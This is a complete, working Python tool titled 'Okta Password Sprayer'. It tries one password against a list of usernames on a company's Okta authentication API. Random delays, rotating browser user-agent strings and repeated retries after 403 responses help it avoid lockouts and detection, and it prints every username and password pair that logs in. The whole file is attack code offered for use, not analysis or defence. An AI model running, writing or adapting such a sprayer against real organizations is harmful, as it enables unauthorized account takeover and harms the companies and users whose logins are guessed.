import requests
from requests.auth import HTTPBasicAuth
from optparse import OptionParser
import sys
import time
import getpass
import random

if ((len(sys.argv) < 9 or len(sys.argv) > 9) and '-h' not in sys.argv):
    print("\nUsage:")
    print(f"python3 {sys.argv[0]} -f <inputfile> -d <domain> -n <min waiting time> -x <max waiting time>\nThen enter password to spray with when prompted.\n")
    sys.exit(1)


parser = OptionParser()
parser.add_option("-f", "--inputfile", help="File with usernames")
parser.add_option("-d", "--domain", help="Company domain")
parser.add_option("-n", "--min", help="Minimum seconds to wait between each spray attempt")
parser.add_option("-x", "--max", help="Maximum seconds to wait between each spray attempt")
(options, args) = parser.parse_args()

password = getpass.getpass()

domain = options.domain.partition('.')
domain2 = domain[0]
min_wait = int(options.min)
max_wait = int(options.max)

oktadomain = f'{domain2}.okta.com'

# user agents to randomize each request
user_agents = [
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 14; CPH2449) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; V2303) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; CPH2269) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.7 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; 22101316G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; 21061119DG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Linux; Android 12; ELS-NX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_14_6; en-us) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.8 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.2365.92 Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
]


url = f'https://{oktadomain}/api/v1/authn'

print("+"*100)
print("Okta Password Sprayer")
print("+"*100)
print(f"Spraying...with random wait time between {min_wait}-{max_wait} seconds...")
with open (f"{options.inputfile}", "r") as oktausers:
    for line in oktausers:
        sleeptime = random.randint(min_wait, max_wait)
        try:
            usr = line.strip()
            data = {"username":f"{format(usr)}","options":{"warnBeforePasswordExpired":"true","multiOptionalFactorEnroll":"true"},"password":f"{format(password)}"}
            print(f"--Waiting {sleeptime} seconds...")
            time.sleep(sleeptime)
            headers = {'User-Agent': random.choice(user_agents)}
            response = requests.post(url, headers=headers, json=data)
            
            if response.status_code == 200:
                print(f"\033[92mlogin successful - {usr}:{password}\033[0m")
                print("\033[1mOkta Response Info:\033[0m")
                print(response.text.encode('utf-8'))
                response.close()
            elif response.status_code == 403:
                print(f"\033[93mForbidden access - {usr} ({response.status_code}) \033[0m")
                # Retry as long as response is 403
                while response.status_code == 403:
                    sleeptime = random.randint(min_wait, max_wait)
                    print("[+]> repeating the request after wait time")
                    print(f"--Waiting {sleeptime} seconds...")
                    time.sleep(sleeptime)
                    headers = {'User-Agent': random.choice(user_agents)}
                    response = requests.post(url, headers=headers, json=data)
                    if response.status_code == 200:
                        print(f"\033[92mlogin successful - {usr}:{password}\033[0m")
                        print("\033[1mOkta Response Info:\033[0m")
                        print(response.text)
                    elif response.status_code == 401:
                        print(f"\033[91mAuthentication failed - {usr}:{password} ({response.status_code}) \033[0m")
                    else:
                        print(f"\033[91mAnother Error - {usr}:{password} ({response.status_code}) \033[0m")
                response.close()
            elif response.status_code == 401:
                print(f"\033[91mAuthentication failed - {usr}:{password} ({response.status_code}) \033[0m")
            else:
                print(f"\033[91mAnother Error - {usr}:{password} ({response.status_code}) \033[0m")

        except Exception as e:
            print(e)
